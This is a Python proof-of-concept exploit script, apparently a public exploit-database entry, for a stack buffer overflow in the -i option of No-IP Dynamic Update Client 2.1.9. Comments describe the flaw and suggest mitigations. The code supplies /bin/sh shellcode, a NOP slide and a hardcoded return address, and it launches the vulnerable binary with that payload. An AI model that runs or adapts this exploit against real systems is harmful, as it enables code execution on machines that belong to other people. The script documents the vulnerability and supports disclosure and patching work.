#!/usr/bin/env python
 
# Title:  No-IP Dynamic Update Client (DUC) 2.1.9 local IPaddress stack overflow
# Author: Alberto Ortega @a0rtega
#         alberto[@]pentbox[.]net
# Date:   May 11 2013 (vulnerability discovered)
 
# Background:
#
# No-IP is probably the most used Dynamic DNS provider worldwide,
# their Dynamic Update Client (DUC) is present by default in tons of
# systems, software repositories and embedded devices.
#
# Description:
#
# To be easily portable, the client is written in C, with minimal
# dependencies. So far so good, but the problem is, it is plagued of
# buffer overflows.
#
# Vulnerability:
#
# This exploit covers a stack-based overflow present in -i
# parameter, IPaddress variable name in source code.
#
# It is probably the most basic parameter, as this is the way to say
# the client that our IP has changed.
#
# For the PoC we will use the Linux x86 client version 2.1.9:
# https://www.noip.com/client/linux/noip-duc-linux.tar.gz
# 3b0f5f2ff8637c73ab337be403252a60
#
# http://a0rtega.pentbox.net/partyhard/noip2iexploit.txt
#
# Solution:
#
# API: https://www.noip.com/integrate/
#
# If you are an embedded systems developer, you should write
# your own implementation of the client.
#
# If you are a repository maintainer, the best solution may be
# change the official client for another one.
#
# Compile the distributed binaries with some mitigations and
# include them by default in Makefile would help too.
 
import os
 
binary = "./noip-2.1.9-1/binaries/noip2-i686"
 
shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"\
            "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"\
            "\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
nop = "\x90"
nop_slide = 296 - len(shellcode)
 
# (gdb) print &IPaddress
# $2 = (<data variable, no debug info> *) 0x80573bc
eip_addr = "\xbc\x73\x05\x08"
 
print "[*] Executing %s ..." % (binary)
 
os.system("%s -i %s%s%s" % (binary, nop*nop_slide, shellcode, eip_addr))
